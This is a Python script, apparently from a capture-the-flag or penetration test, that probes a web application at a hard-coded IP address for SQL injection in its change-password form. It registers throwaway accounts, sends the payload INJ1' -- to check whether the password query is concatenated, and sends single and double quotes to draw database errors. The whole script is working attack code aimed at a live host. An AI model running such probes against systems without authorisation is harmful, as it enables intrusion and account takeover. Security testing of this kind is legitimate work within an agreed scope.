import urllib.request, urllib.parse, http.cookiejar, re, time, sys

BASE = "http://103.163.47.230:33663"


def sess():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op


def req(op, p, data=None, method=None, hdrs=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {}
    if body is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
    h.update(hdrs or {})
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=15)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)


def clean(b):
    b = re.sub(r"<style.*?</style>", "", b, flags=re.S)
    b = re.sub(r"<script.*?</script>", "", b, flags=re.S)
    b = re.sub(r"<[^>]+>", " ", b)
    return re.sub(r"\s+", " ", b).strip()


def newuser(tag):
    u = tag + str(int(time.time() * 1000) % 100000)
    pw = "orig" + u
    op = sess()
    req(op, "/register", {"username": u, "password": pw}, "POST")
    s, b = req(op, "/login", {"username": u, "password": pw}, "POST")
    assert "我的账户" in b, (u, clean(b)[:200])
    return op, u, pw


# 1) 基线：正常改密
op, u, pw = newuser("base")
s, b = req(op, "/change_password", {"new_password": "plainpw"}, "POST")
print("base change:", s, clean(b)[:120])
op2 = sess()
s, b = req(op2, "/login", {"username": u, "password": "plainpw"}, "POST")
print("login with plainpw:", "OK" if "我的账户" in b else "FAIL")

# 2) 注入探测：' --  若拼接，则本机密码被设为 INJ1
op, u, pw = newuser("inj1")
s, b = req(op, "/change_password", {"new_password": "INJ1' -- "}, "POST")
print("\ninj1 change:", s, clean(b)[:200])
op2 = sess()
s, b = req(op2, "/login", {"username": u, "password": "INJ1"}, "POST")
print("login u/INJ1:", "OK-SQLi!" if "我的账户" in b else "no")

# 3) 单引号报错探测
op, u, pw = newuser("err1")
s, b = req(op, "/change_password", {"new_password": "x'"}, "POST")
print("\nerr1:", s, clean(b)[:300])

# 4) 双引号
op, u, pw = newuser("err2")
s, b = req(op, "/change_password", {"new_password": 'x"'}, "POST")
print("\nerr2:", s, clean(b)[:300])
